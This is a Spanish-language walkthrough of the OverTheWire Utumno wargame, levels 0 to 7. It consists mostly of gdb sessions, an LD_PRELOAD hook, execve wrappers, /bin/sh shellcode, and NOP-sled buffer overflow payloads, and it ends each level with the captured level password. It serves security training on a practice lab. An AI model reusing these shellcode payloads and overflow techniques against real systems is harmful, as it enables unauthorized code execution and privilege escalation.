# Utumno - LAB_5

## Utumno Level 0
SSH : ssh utumno0@utumno.labs.overthewire.org -p 2227
Pass : utumno0
~~~
cd /utumno/
./utumno0
file ./utumno0

mkdir -p /tmp/axc
cd /tmp/axc
~~~
creamos este archivo y ponemos este codigo
nano preload.c
~~~
#include <stdio.h>

int puts ( const char * str ) {
	printf("%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x\n");

	return 0;
}
~~~
ahora ejecutamos
~~~
gcc preload.c -o preload.so -fPIC -shared -ldl -m32
LD_PRELOAD="./preload.so" /utumno/utumno0
~~~

cambiamos por las direcciones que nos dieron:
nano preload.c
~~~
#include <stdio.h>

int puts ( const char * str ) {
	printf("%s\n", 0x0804917d);
	printf("%s\n", 0x0804a01d);
	printf("%s\n", 0x0804a008);

	return 0;
}
~~~
ahora ejecutamos:
~~~
gcc preload.c -o preload.so -fPIC -shared -ldl -m32
LD_PRELOAD="./preload.so" /utumno/utumno0

password: ytvWa6DzmL
~~~




## Utumno Level 01
SSH : ssh utumno1@utumno.labs.overthewire.org -p 2227
~~~
cd /utumno/
ltrace ./utumno1 123
mkdir /tmp/ax1
ltrace ./utumno1 /tmp/ax1
cd /tmp/ax1
touch sh_AAAA
/utumno/utumno1 /tmp/ax1
gdb -q /utumno/utumno1

set disassembly-flavor intel
disas run
break *run+84
run /tmp/ax1
x/x $esp
x/x 0xf7fc0000


~~~
de gdb sale
~~~
Dump of assembler code for function run:
   0x080491c6 <+0>:	push   %ebp
   0x080491c7 <+1>:	mov    %esp,%ebp
   0x080491c9 <+3>:	sub    $0xc,%esp
   0x080491cc <+6>:	mov    0x8(%ebp),%eax
   0x080491cf <+9>:	mov    %eax,-0xc(%ebp)
   0x080491d2 <+12>:	mov    %gs:0x14,%eax
   0x080491d8 <+18>:	mov    %eax,-0x4(%ebp)
   0x080491db <+21>:	xor    %eax,%eax
   0x080491dd <+23>:	mov    0x804b22c,%eax
   0x080491e2 <+28>:	push   $0x1000
   0x080491e7 <+33>:	push   -0xc(%ebp)
   0x080491ea <+36>:	push   %eax
   0x080491eb <+37>:	call   0x8049070 <strncpy@plt>
   0x080491f0 <+42>:	add    $0xc,%esp
   0x080491f3 <+45>:	lea    -0x8(%ebp),%eax
   0x080491f6 <+48>:	add    $0xc,%eax
   0x080491f9 <+51>:	mov    %eax,-0x8(%ebp)
   0x080491fc <+54>:	mov    0x804b22c,%edx
   0x08049202 <+60>:	mov    -0x8(%ebp),%eax
   0x08049205 <+63>:	mov    %edx,(%eax)
   0x08049207 <+65>:	nop
   0x08049208 <+66>:	mov    -0x4(%ebp),%eax
   0x0804920b <+69>:	sub    %gs:0x14,%eax
   0x08049212 <+76>:	je     0x8049219 <run+83>
   0x08049214 <+78>:	call   0x8049040 <__stack_chk_fail@plt>
   0x08049219 <+83>:	leave
   0x0804921a <+84>:	ret
End of assembler dump.

~~~

~~~
section .text
global _start

_start:
push 0xb
pop eax
xor edx, edx
push edx
push word 0x702d
mov ecx, esp
push edx
push 0x6873796d
mov ebx, esp

push edx
push ecx
push ebx

mov ecx, esp
int 0x80
xor eax, eax
inc eax
int 0x80

-------------------------

section .text
    global _start

_start:
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov al, 0x0b
    int 0x80

~~~

~~~



nano shell.asm
nasm -f elf32 shell.asm
ld -m elf_i386 -s -o shell shell.o
objdump -d ./shell.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
touch sh_$(python3 -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80')")
ln -s /bin/sh /tmp/ax1/hack
/utumno/utumno1 `pwd`

ceewaceiph
~~~

## Utumno Level 02

SSH : ssh utumno2@utumno.labs.overthewire.org -p 2227

~~~
gdb -q ./utumno2
set disassembly-flavor intel
disas main
~~~
utilizamos este codigo
~~~
#include <unistd.h>

void main() {
    char *envp[] = {};

    execve("/utumno/utumno2", NULL, envp);
}


#include <unistd.h>

void main() {
    char *envp[] = {"", "", "", "", "", "", "", "", "",
        "AAAABBBBCCCCDDDDEEEEFFFFAAAA",
        NULL};
    execve("/utumno/utumno2", NULL, envp);
}
~~~

~~~
gcc -m32 -static execve.c -o execve
./execve
strace ./execve




global _start

section .text
_start:
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push eax
mov edx, esp
push ebx
mov ecx, esp
mov al, 0xb
int 0x80
~~~

~~~
ld -m elf_i386 -s -o shell shell.o
objdump -d ./shell.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

gdb -q ./code
gcc -m32 -static code.c -o code
./code
whoami
cat /etc/utumno_pass/utumno3

zuudafiine
~~~

## Utumno Level 03
SSH : ssh utumno3@utumno.labs.overthewire.org -p 2227
~~~
gdb -q ./utumno3
set disassembly-flavor intel
break main
run
x/bx 0xffffd68c
break *main+94
run <<< $(python -c "print '\x28\x41'")
x/8wx $ebp
run <<< $(python -c "print '\x28\x41\x2a\x42\x2c\x43\x22\x44'")

export EGG=`python -c 'print "\x90"*500 + "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x2f\x61\x78\x63\x68\x2f\x74\x6d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80"'`
utumno3@melinda:/tmp/uh3$ ln -s /etc/utumno_pass/utumno4 /tmp/axc
ln -s /etc/utumno_pass/utumno4 /tmp/axc
gdb -q ./utumno3
set disassembly-flavor intel
break *main
run
x/1200x $esp-1200
python -c "print '\x28\x9c\x2a\xdc\x2c\xff\x22\xff'" | ./utumno3

oogieleoga
~~~

## Utumno Level 04

ssh utumno4@utumno.labs.overthewire.org -p 2227

~~~
gdb -q ./utumno4


0x0804844b <+0>:	push   ebp
0x0804844c <+1>:	mov    ebp,esp
0x0804844e <+3>:	sub    esp,0xff04
0x08048454 <+9>:	mov    eax,DWORD PTR [ebp+0xc]
0x08048457 <+12>:	add    eax,0x4
0x0804845a <+15>:	mov    eax,DWORD PTR [eax] EAX = ptr to our input string
0x0804845c <+17>:	push   eax ; push the ptr on the stack
0x0804845d <+18>:	call   0x8048330 <atoi@plt> ; convert it to integer
0x08048462 <+23>:	add    esp,0x4
0x08048465 <+26>:	mov    DWORD PTR [ebp-0x4],eax ; store the result of atoi()
0x08048468 <+29>:	mov    eax,DWORD PTR [ebp-0x4] ; move the result in eax
0x0804846b <+32>:	mov    WORD PTR [ebp-0x6],ax ; move AX on the stack
0x0804846f <+36>:	cmp    WORD PTR [ebp-0x6],0x3f; compare AX to 63
0x08048474 <+41>:	jbe    0x804847d <main+50> ; if below or equal to 63 continue
0x08048476 <+43>:	push   0x1
0x08048478 <+45>:	call   0x8048310 <exit@plt>
0x0804847d <+50>:	mov    edx,DWORD PTR [ebp-0x4]
0x08048480 <+53>:	mov    eax,DWORD PTR [ebp+0xc]
0x08048483 <+56>:	add    eax,0x8
0x08048486 <+59>:	mov    eax,DWORD PTR [eax] ; ptr to the second argument
0x08048488 <+61>:	push   edx ; number of bytes to copy (first arg)
0x08048489 <+62>:	push   eax ; source of data to be copied (second arg)
0x0804848a <+63>:	lea    eax,[ebp-0xff02]
0x08048490 <+69>:	push   eax ; destination where the data is to be copied
0x08048491 <+70>:	call   0x8048300 <memcpy@plt>
0x08048496 <+75>:	add    esp,0xc
0x08048499 <+78>:	mov    eax,0x0
0x0804849e <+83>:	leave
0x0804849f <+84>:	ret



set disassembly-flavor intel
run 65536 $(python -c "print 'A' * 65536")
run 65536 $(python -c "print 'A' * 65286 + 'BBBB' + 'C' * 246")

run 65536 $(python -c "print '\x90' * 65265 + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'BBBB' + '\x90' * 246")
x/300x $esp-300
./utumno4 65536 $(python -c "print '\x90' * 65257 + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 8 * '\x90' + '\x60\xd6\xfe\xff' + 'C' * 246")
 whoami
 cat /etc/utumno_pass/utumno5

 woucaejiek
~~~

## Utumno Level 05
ssh utumno5@utumno.labs.overthewire.org -p 2227

~~~
gdb -q ./utumno5
set disassembly-flavor intel
set disassemble-next-line on
disas main
disas hihi

gcc -m32 code.c -o code
ltrace ./code
~~~
utilizamos
~~~
#include <unistd.h>

void main() {
    char *envp[] = {"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L"};
    execve("/utumno/utumno5", NULL, envp);
}
~~~

~~~
gcc -m32 code.c -o code
ltrace ./code
strace ./code
gdb -q ./code
set disassembly-flavor intel
run
gcc -m32 code.c -o code
./code
whoami
cat /etc/utumno_pass/utumno6

eiluquieth
~~~

## Utumno Level 06
ssh utumno6@utumno.labs.overthewire.org -p 2227
~~~
./utumno6
./utumno6 1
./utumno6 1 2
./utumno6 1 2 3
gdb -q ./utumno6
set disassembly-flavor intel
disas main
./utumno6 8 A foobar
strace ./utumno6 -1 0x41414141 foobar

gdb -q ./utumno6
set disassembly-flavor intel
run -1 0x41414141 BBBB
x/16x $esp
run -1 0xffffd628 BBBB
export EGG=$(python -c "print 300 * '\x90' + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'")

gdb -q ./utumno6
set disassembly-flavor intel
set disassemble-next-line on
run -1 0xffffffff $(python -c "print 'BBBB'")
info reg esp
run -1 0xffffd4e8 $(python -c "print 'BBBB'")
x/2048x $esp
run -1 0xffffd4e8 $(python -c "print '\xcc\xdd\xff\xff'")
./utumno6 -1 0xffffd518 $(python -c "print '\xcc\xdd\xff\xff'")
whoami
cat /etc/utumno_pass/utumno7

totiquegae
~~~

## Utumno Level 07
ssh utumno7@utumno.labs.overthewire.org -p 2227

~~~
gdb -q ./utumno7
set disassembly-flavor intel
disas main
disas vuln
disas _setjmp
disas jmp
gdb -q ./utumno7
set disassembly-flavor intel
set disassemble-next-line on
run $(python -c 'print "A"*140')
set disassemble-next-line on
run $(python -c 'print "A"*140 + "BBBB"')
run $(python -c 'print "A"*140 + "\xe4\xd7\xff\xff"')
run $(python -c "print 'AAAA' + 'BBBB' +  '\x90' * 132 + '\xdd\xd7\xff\xff'")


gdb -q ./utumno7
set disassembly-flavor intel
set disassemble-next-line on
run $(python -c "print 'AAAA' + 'BBBB' +  '\x90' * 111  + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\xdd\xd7\xff\xff'")
run $(python -c "print 'AAAA' + '\x11\xd8\xff\xff' +  '\x90' * 111  + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\xdd\xd7\xff\xff'")
while [ $i  -lt  255 ]
whoami
cat /etc/utumno_pass/utumno8

jaeyeetiav
~~~